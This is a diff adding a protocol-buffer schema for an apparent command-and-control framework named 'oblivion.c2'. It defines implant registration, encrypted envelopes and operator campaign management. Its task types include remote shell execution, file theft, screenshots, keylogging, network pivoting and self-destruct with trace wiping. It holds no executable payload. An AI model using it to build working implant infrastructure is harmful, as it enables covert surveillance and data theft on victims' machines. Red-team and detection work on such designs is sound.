@@ -1,0 +1,143 @@
+syntax = "proto3";
+package oblivion.c2;
+
+import "google/protobuf/timestamp.proto";
+
+// Implant -> Server
+message ImplantEnvelope {
+    bytes session_id = 1;
+    bytes nonce = 2;
+    bytes ciphertext = 3;  // Encrypted InnerImplantMessage
+}
+
+message InnerImplantMessage {
+    oneof payload {
+        RegisterRequest register = 1;
+        TaskResult result = 2;
+        Heartbeat heartbeat = 3;
+        ErrorReport error = 4;
+    }
+}
+
+message RegisterRequest {
+    bytes implant_id = 1;
+    string hostname = 2;
+    string username = 3;
+    string os_version = 4;
+    uint32 process_id = 5;
+    bytes public_key = 6;
+    map<string, string> metadata = 7;
+}
+
+message TaskResult {
+    uint64 task_id = 1;
+    oneof result {
+        bytes output = 2;
+        string error = 3;
+        bool timeout = 4;
+    }
+    google.protobuf.Timestamp completed_at = 5;
+}
+
+message Heartbeat {
+    uint32 uptime_seconds = 1;
+    float cpu_percent = 2;
+    uint64 memory_used_mb = 3;
+}
+
+message ErrorReport {
+    uint32 error_code = 1;
+    string message = 2;
+    bytes context = 3;
+}
+
+// Server -> Implant
+message ServerEnvelope {
+    bytes nonce = 1;
+    bytes ciphertext = 2;  // Encrypted InnerServerMessage
+}
+
+message InnerServerMessage {
+    oneof payload {
+        RegisterResponse register_response = 1;
+        TaskAssignment task = 2;
+        ReconfigureCommand reconfigure = 3;
+        TerminateCommand terminate = 4;
+    }
+}
+
+message RegisterResponse {
+    bool success = 1;
+    bytes assigned_session_id = 2;
+    uint32 heartbeat_interval_sec = 3;
+    string error_message = 4;
+}
+
+message TaskAssignment {
+    uint64 task_id = 1;
+    TaskType task_type = 2;
+    bytes payload = 3;
+    uint32 timeout_sec = 4;
+}
+
+enum TaskType {
+    SHELL_EXEC = 0;
+    FILE_UPLOAD = 1;
+    FILE_DOWNLOAD = 2;
+    PROCESS_LIST = 3;
+    SCREENSHOT = 4;
+    KEYLOG_START = 5;
+    KEYLOG_STOP = 6;
+    PIVOT_SETUP = 7;
+    SELF_DESTRUCT = 99;
+}
+
+message ReconfigureCommand {
+    uint32 new_heartbeat_interval = 1;
+    string new_c2_endpoint = 2;
+    bool jitter_enabled = 3;
+}
+
+message TerminateCommand {
+    bool wipe_traces = 1;
+    uint32 delay_seconds = 2;
+}
+
+// Operator -> Server (internal gRPC/HTTP API)
+message OperatorCommand {
+    string campaign_id = 1;
+    string session_id = 2;
+    oneof action {
+        CreateTask create_task = 3;
+        GetSessionInfo get_info = 4;
+        ListSessions list_sessions = 5;
+        TerminateSession terminate = 6;
+    }
+}
+
+message CreateTask {
+    TaskType task_type = 1;
+    bytes payload = 2;
+    uint32 timeout_sec = 3;
+}
+
+message GetSessionInfo {
+    string session_id = 1;
+}
+
+message ListSessions {
+    string campaign_id = 1;
+    SessionStatus filter_status = 2;
+}
+
+enum SessionStatus {
+    ACTIVE = 0;
+    IDLE = 1;
+    STALE = 2;
+    TERMINATED = 3;
+}
+
+message TerminateSession {
+    string session_id = 1;
+    bool wipe_implant = 2;
+}
